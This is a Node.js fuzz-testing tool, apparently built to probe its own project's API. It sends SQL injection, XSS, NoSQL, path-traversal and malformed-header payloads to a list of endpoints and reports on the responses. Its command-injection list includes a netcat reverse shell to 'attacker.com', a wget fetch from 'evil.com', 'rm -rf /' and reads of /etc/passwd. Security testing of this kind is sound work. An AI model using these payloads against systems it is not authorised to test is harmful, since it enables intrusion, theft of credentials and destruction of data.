#!/usr/bin/env node

/**
 * FlashFusion Security Chaos Agent - Fuzz Testing Framework
 * 
 * This tool performs comprehensive security testing against FlashFusion API endpoints
 * including malicious input injection, stress testing, and vulnerability scanning.
 * 
 * Features:
 * - Malformed request fuzzing
 * - SQL injection testing
 * - XSS payload testing  
 * - Buffer overflow attempts
 * - Rate limiting validation
 * - Authentication bypass testing
 * - CORS validation
 * - Error handling analysis
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

class SecurityChaosAgent {
    constructor(options = {}) {
        this.baseUrl = options.baseUrl || 'http://localhost:3000';
        this.maxConcurrent = options.maxConcurrent || 10;
        this.timeout = options.timeout || 5000;
        this.logFile = options.logFile || '/tmp/security-chaos-results.log';
        this.resultsFile = options.resultsFile || '/tmp/security-test-results.json';
        
        this.stats = {
            totalRequests: 0,
            errors: 0,
            crashes: 0,
            timeouts: 0,
            vulnerabilities: [],
            startTime: new Date()
        };
        
        this.vulnerabilityPatterns = {
            sql_injection: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "admin'--",
                "admin'/*",
                "' or 1=1#",
                "' or 1=1--",
                "1' or '1'='1",
                "x' AND email IS NULL; --",
                "'; EXEC xp_cmdshell('dir'); --"
            ],
            xss_payloads: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<video><source onerror=\"alert('XSS')\">",
                "\"><script>alert('XSS')</script>",
                "';alert('XSS');//",
                "\");alert('XSS');//"
            ],
            command_injection: [
                "; ls -la",
                "| cat /etc/passwd",
                "& whoami",
                "; rm -rf /",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; curl malicious-site.com",
                "| nc -e /bin/sh attacker.com 4444",
                "; wget http://evil.com/shell.sh",
                "$(wget -O- http://evil.com/script.js)"
            ],
            path_traversal: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ],
            buffer_overflow: [
                "A".repeat(1000),
                "A".repeat(10000),
                "A".repeat(100000),
                "\x00".repeat(1000),
                "\xff".repeat(1000),
                "%n".repeat(100),
                "%s".repeat(100),
                "%x".repeat(100)
            ],
            nosql_injection: [
                "{'$gt':''}",
                "{'$ne':null}",
                "{'$regex':'.*'}",
                "{'$where':'this.password.length > 0'}",
                "{'$or':[{},{'a':'a'}]}",
                "admin', $where: '1==1', $comment: ''",
                "{'username':{'$regex':'.*'},'password':{'$regex':'.*'}}"
            ]
        };
        
        this.malformedRequests = {
            headers: [
                { 'Content-Length': '-1' },
                { 'Content-Length': '999999999999999999999' },
                { 'Transfer-Encoding': 'chunked', 'Content-Length': '10' },
                { 'Host': 'evil.com' },
                { 'X-Forwarded-For': '127.0.0.1' },
                { 'User-Agent': 'A'.repeat(10000) },
                { 'Authorization': 'Bearer ' + 'A'.repeat(5000) },
                { 'Cookie': 'session=' + 'A'.repeat(8000) }
            ],
            methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT'],
            invalidJson: [
                '{"unclosed": "string"',
                '{"number": 123abc}',
                '{"circular": {"ref":',
                '{"null": \x00}',
                '{"unicode": "\uD800"}',
                '{"huge_number": ' + '9'.repeat(1000) + '}',
                '{"deep":' + '{"a":'.repeat(100) + 'null' + '}'.repeat(100) + '}'
            ]
        };
        
        this.endpoints = [
            '/',
            '/health',
            '/api/health',
            '/api/status',
            '/status',
            '/api/agents/chat',
            '/api/zapier/incoming-webhook',
            '/api/bulletproof',
            '/api/index',
            '/api',
            '/api/webhooks',
            '/api/github',
            '/api/auth',
            '/api/users',
            '/api/admin',
            '/api/config',
            '/api/logs',
            '/api/database',
            '/api/files',
            '/api/upload'
        ];
    }
    
    log(message, level = 'INFO') {
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] [${level}] ${message}\n`;
        
        console.log(logEntry.trim());
        
        try {
            fs.appendFileSync(this.logFile, logEntry);
        } catch (error) {
            console.error('Failed to write to log file:', error.message);
        }
    }
    
    async makeRequest(endpoint, options = {}) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            this.stats.totalRequests++;
            
            const url = new URL(endpoint, this.baseUrl);
            const protocol = url.protocol === 'https:' ? https : http;
            
            const requestOptions = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: options.method || 'GET',
                headers: {
                    'User-Agent': 'SecurityChaosAgent/1.0',
                    'Accept': '*/*',
                    ...options.headers
                },
                timeout: this.timeout
            };
            
            const req = protocol.request(requestOptions, (res) => {
                let data = '';
                
                res.on('data', (chunk) => {
                    data += chunk;
                });
                
                res.on('end', () => {
                    const responseTime = Date.now() - startTime;
                    const result = {
                        endpoint,
                        method: options.method || 'GET',
                        statusCode: res.statusCode,
                        headers: res.headers,
                        body: data,
                        responseTime,
                        requestOptions: options,
                        timestamp: new Date().toISOString()
                    };
                    
                    this.analyzeResponse(result);
                    resolve(result);
                });
            });
            
            req.on('error', (error) => {
                this.stats.errors++;
                const responseTime = Date.now() - startTime;
                const result = {
                    endpoint,
                    method: options.method || 'GET',
                    error: error.message,
                    responseTime,
                    requestOptions: options,
                    timestamp: new Date().toISOString()
                };
                
                this.log(`Request error: ${endpoint} - ${error.message}`, 'ERROR');
                resolve(result);
            });
            
            req.on('timeout', () => {
                this.stats.timeouts++;
                req.destroy();
                const result = {
                    endpoint,
                    method: options.method || 'GET',
                    error: 'Request timeout',
                    responseTime: this.timeout,
                    requestOptions: options,
                    timestamp: new Date().toISOString()
                };
                
                this.log(`Request timeout: ${endpoint}`, 'WARN');
                resolve(result);
            });
            
            // Send request body if provided
            if (options.body) {
                try {
                    req.write(options.body);
                } catch (error) {
                    this.log(`Error writing request body: ${error.message}`, 'ERROR');
                }
            }
            
            req.end();
        });
    }
    
    analyzeResponse(result) {
        const { statusCode, headers, body, endpoint, error } = result;
        
        // Check for server crashes or unexpected errors
        if (statusCode >= 500 || error) {
            this.stats.crashes++;
            this.log(`Potential crash detected: ${endpoint} - Status: ${statusCode}, Error: ${error}`, 'CRITICAL');
            
            this.stats.vulnerabilities.push({
                type: 'server_error',
                endpoint,
                details: `Status: ${statusCode}, Error: ${error}`,
                severity: 'high',
                timestamp: new Date().toISOString()
            });
        }
        
        // Check for information disclosure
        if (body && typeof body === 'string') {
            const sensitivePatterns = [
                /password/i,
                /secret/i,
                /token/i,
                /key/i,
                /database/i,
                /connection/i,
                /stack trace/i,
                /error.*line.*file/i,
                /sql.*error/i,
                /mongodb/i,
                /redis/i
            ];
            
            sensitivePatterns.forEach(pattern => {
                if (pattern.test(body)) {
                    this.stats.vulnerabilities.push({
                        type: 'information_disclosure',
                        endpoint,
                        details: `Sensitive information detected: ${pattern}`,
                        severity: 'medium',
                        timestamp: new Date().toISOString()
                    });
                }
            });
        }
        
        // Check for missing security headers
        const securityHeaders = [
            'x-frame-options',
            'x-content-type-options',
            'x-xss-protection',
            'strict-transport-security',
            'content-security-policy'
        ];
        
        securityHeaders.forEach(header => {
            if (!headers[header] && !headers[header.toLowerCase()]) {
                this.stats.vulnerabilities.push({
                    type: 'missing_security_header',
                    endpoint,
                    details: `Missing security header: ${header}`,
                    severity: 'low',
                    timestamp: new Date().toISOString()
                });
            }
        });
        
        // Check for verbose error messages
        if (body && body.includes('stack') && statusCode >= 400) {
            this.stats.vulnerabilities.push({
                type: 'verbose_error',
                endpoint,
                details: 'Detailed error information exposed',
                severity: 'medium',
                timestamp: new Date().toISOString()
            });
        }
    }
    
    async testSQLInjection() {
        this.log('Starting SQL Injection tests...', 'INFO');
        
        for (const endpoint of this.endpoints) {
            for (const payload of this.vulnerabilityPatterns.sql_injection) {
                // Test in URL parameters
                await this.makeRequest(`${endpoint}?id=${encodeURIComponent(payload)}`);
                await this.makeRequest(`${endpoint}?user=${encodeURIComponent(payload)}`);
                await this.makeRequest(`${endpoint}?search=${encodeURIComponent(payload)}`);
                
                // Test in POST body
                await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        input: payload,
                        taskType: payload,
                        userId: payload 
                    })
                });
                
                await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `username=${encodeURIComponent(payload)}&password=${encodeURIComponent(payload)}`
                });
            }
        }
    }
    
    async testXSS() {
        this.log('Starting XSS tests...', 'INFO');
        
        for (const endpoint of this.endpoints) {
            for (const payload of this.vulnerabilityPatterns.xss_payloads) {
                // Test in URL parameters
                await this.makeRequest(`${endpoint}?message=${encodeURIComponent(payload)}`);
                await this.makeRequest(`${endpoint}?name=${encodeURIComponent(payload)}`);
                
                // Test in POST body
                await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ input: payload })
                });
                
                // Test in headers
                await this.makeRequest(endpoint, {
                    headers: { 'X-Forwarded-For': payload }
                });
            }
        }
    }
    
    async testCommandInjection() {
        this.log('Starting Command Injection tests...', 'INFO');
        
        for (const endpoint of this.endpoints) {
            for (const payload of this.vulnerabilityPatterns.command_injection) {
                await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        command: payload,
                        input: payload,
                        file: payload 
                    })
                });
            }
        }
    }
    
    async testPathTraversal() {
        this.log('Starting Path Traversal tests...', 'INFO');
        
        for (const endpoint of this.endpoints) {
            for (const payload of this.vulnerabilityPatterns.path_traversal) {
                await this.makeRequest(`${endpoint}/${payload}`);
                await this.makeRequest(`${endpoint}?file=${encodeURIComponent(payload)}`);
                await this.makeRequest(`${endpoint}?path=${encodeURIComponent(payload)}`);
            }
        }
    }
    
    async testBufferOverflow() {
        this.log('Starting Buffer Overflow tests...', 'INFO');
        
        for (const endpoint of this.endpoints) {
            for (const payload of this.vulnerabilityPatterns.buffer_overflow) {
                await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: payload })
                });
                
                await this.makeRequest(`${endpoint}?data=${encodeURIComponent(payload)}`);
            }
        }
    }
    
    async testMalformedRequests() {
        this.log('Starting Malformed Request tests...', 'INFO');
        
        for (const endpoint of this.endpoints) {
            // Test malformed headers
            for (const headers of this.malformedRequests.headers) {
                await this.makeRequest(endpoint, { headers });
            }
            
            // Test different HTTP methods
            for (const method of this.malformedRequests.methods) {
                await this.makeRequest(endpoint, { method });
            }
            
            // Test malformed JSON
            for (const body of this.malformedRequests.invalidJson) {
                await this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body
                });
            }
        }
    }
    
    async testRateLimiting() {
        this.log('Starting Rate Limiting tests...', 'INFO');
        
        const rapidRequests = [];
        const endpoint = '/api/agents/chat';
        
        // Send 200 rapid requests to test rate limiting
        for (let i = 0; i < 200; i++) {
            rapidRequests.push(
                this.makeRequest(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        taskType: 'test',
                        input: `Rate limit test ${i}` 
                    })
                })
            );
        }
        
        const results = await Promise.all(rapidRequests);
        const rateLimited = results.filter(r => r.statusCode === 429).length;
        
        if (rateLimited === 0) {
            this.stats.vulnerabilities.push({
                type: 'missing_rate_limiting',
                endpoint,
                details: 'No rate limiting detected after 200 rapid requests',
                severity: 'high',
                timestamp: new Date().toISOString()
            });
        }
        
        this.log(`Rate limiting test: ${rateLimited}/200 requests blocked`, 'INFO');
    }
    
    async testAuthentication() {
        this.log('Starting Authentication tests...', 'INFO');
        
        const authEndpoints = [
            '/api/admin',
            '/api/users',
            '/api/config',
            '/api/logs'
        ];
        
        for (const endpoint of authEndpoints) {
            // Test without authentication
            const result = await this.makeRequest(endpoint);
            
            if (result.statusCode < 400) {
                this.stats.vulnerabilities.push({
                    type: 'missing_authentication',
                    endpoint,
                    details: `Endpoint accessible without authentication (Status: ${result.statusCode})`,
                    severity: 'critical',
                    timestamp: new Date().toISOString()
                });
            }
        }
    }
    
    async stressTest() {
        this.log('Starting Stress Test...', 'INFO');
        
        const concurrentRequests = [];
        const endpoint = '/api/status';
        
        // Create 50 concurrent connections
        for (let i = 0; i < 50; i++) {
            concurrentRequests.push(this.makeRequest(endpoint));
        }
        
        const results = await Promise.all(concurrentRequests);
        const failures = results.filter(r => r.error || r.statusCode >= 500).length;
        
        this.log(`Stress test: ${failures}/50 requests failed`, 'INFO');
        
        if (failures > 10) {
            this.stats.vulnerabilities.push({
                type: 'poor_performance_under_load',
                endpoint,
                details: `${failures}/50 requests failed under concurrent load`,
                severity: 'medium',
                timestamp: new Date().toISOString()
            });
        }
    }
    
    async runAllTests() {
        this.log('🚀 Starting Security Chaos Agent - Comprehensive API Fuzz Testing', 'INFO');
        this.log(`Target: ${this.baseUrl}`, 'INFO');
        this.log(`Log file: ${this.logFile}`, 'INFO');
        
        try {
            await this.testSQLInjection();
            await this.testXSS();
            await this.testCommandInjection();
            await this.testPathTraversal();
            await this.testBufferOverflow();
            await this.testMalformedRequests();
            await this.testRateLimiting();
            await this.testAuthentication();
            await this.stressTest();
            
            this.generateReport();
            
        } catch (error) {
            this.log(`Fatal error during testing: ${error.message}`, 'CRITICAL');
            this.stats.crashes++;
        }
    }
    
    generateReport() {
        const endTime = new Date();
        const duration = endTime - this.stats.startTime;
        
        const report = {
            summary: {
                target: this.baseUrl,
                startTime: this.stats.startTime.toISOString(),
                endTime: endTime.toISOString(),
                duration: `${Math.round(duration / 1000)}s`,
                totalRequests: this.stats.totalRequests,
                errors: this.stats.errors,
                crashes: this.stats.crashes,
                timeouts: this.stats.timeouts,
                vulnerabilitiesFound: this.stats.vulnerabilities.length
            },
            vulnerabilities: this.stats.vulnerabilities,
            severityBreakdown: {
                critical: this.stats.vulnerabilities.filter(v => v.severity === 'critical').length,
                high: this.stats.vulnerabilities.filter(v => v.severity === 'high').length,
                medium: this.stats.vulnerabilities.filter(v => v.severity === 'medium').length,
                low: this.stats.vulnerabilities.filter(v => v.severity === 'low').length
            }
        };
        
        // Write detailed report to file
        try {
            fs.writeFileSync(this.resultsFile, JSON.stringify(report, null, 2));
            this.log(`Detailed report saved to: ${this.resultsFile}`, 'INFO');
        } catch (error) {
            this.log(`Failed to save report: ${error.message}`, 'ERROR');
        }
        
        // Log summary
        this.log('', 'INFO');
        this.log('🔍 SECURITY CHAOS AGENT RESULTS', 'INFO');
        this.log('================================', 'INFO');
        this.log(`Total Requests: ${report.summary.totalRequests}`, 'INFO');
        this.log(`Duration: ${report.summary.duration}`, 'INFO');
        this.log(`Errors: ${report.summary.errors}`, 'INFO');
        this.log(`Crashes: ${report.summary.crashes}`, 'INFO');
        this.log(`Timeouts: ${report.summary.timeouts}`, 'INFO');
        this.log(`Vulnerabilities: ${report.summary.vulnerabilitiesFound}`, 'INFO');
        this.log('', 'INFO');
        this.log('Severity Breakdown:', 'INFO');
        this.log(`  Critical: ${report.severityBreakdown.critical}`, 'INFO');
        this.log(`  High: ${report.severityBreakdown.high}`, 'INFO');
        this.log(`  Medium: ${report.severityBreakdown.medium}`, 'INFO');
        this.log(`  Low: ${report.severityBreakdown.low}`, 'INFO');
        
        if (report.summary.vulnerabilitiesFound > 0) {
            this.log('', 'INFO');
            this.log('⚠️  VULNERABILITIES DETECTED:', 'WARN');
            this.stats.vulnerabilities.forEach((vuln, index) => {
                this.log(`${index + 1}. ${vuln.type} - ${vuln.endpoint} (${vuln.severity})`, 'WARN');
                this.log(`   ${vuln.details}`, 'WARN');
            });
        } else {
            this.log('✅ No major vulnerabilities detected!', 'INFO');
        }
        
        this.log('', 'INFO');
        this.log('Testing completed. Check logs for detailed information.', 'INFO');
    }
}

// CLI Interface
if (require.main === module) {
    const args = process.argv.slice(2);
    const options = {};
    
    // Parse command line arguments
    for (let i = 0; i < args.length; i += 2) {
        const key = args[i].replace(/^--/, '');
        const value = args[i + 1];
        options[key] = value;
    }
    
    // Set defaults
    if (!options.baseUrl) {
        options.baseUrl = process.env.TARGET_URL || 'http://localhost:3000';
    }
    
    const agent = new SecurityChaosAgent(options);
    agent.runAllTests().catch(error => {
        console.error('Fatal error:', error);
        process.exit(1);
    });
}

module.exports = SecurityChaosAgent;